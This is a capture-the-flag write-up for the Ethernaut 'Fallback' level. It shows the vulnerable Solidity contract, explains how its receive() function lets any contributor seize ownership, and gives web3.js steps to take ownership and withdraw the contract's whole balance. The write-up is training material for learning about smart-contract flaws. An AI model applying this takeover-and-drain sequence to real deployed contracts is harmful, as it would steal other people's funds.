# Ethernaut Fallback Level Attack

## Goal

Beat the level by:

- claiming ownership of the contract
- reducing the contract balance to `0`

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

```

## Root cause

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}

```

This function lets any address become the owner

## Attack plan

Step 1: Make a small contribution 

``` javascript
await contract.methods.contribute().send({
  from: player,
  value: web3.utils.toWei("0.0001", "ether")
})
```

Step 2: Sending ETH directly to the contract

``` javascript
await web3.eth.sendTransaction({
  from: player,
  to: contract.options.address,
  value: web3.utils.toWei("0.0001", "ether")
})
```

Step 3: Withdraw all ETH 

```javascript
await contract.methods.owner().call() // verify ownership

// Withdraw full balance
await contract.methods.withdraw().send({
  from: player
})
```

Step 4: Confirm contract balance

```javascript
await web3.eth.getBalance(contract.options.address)
```
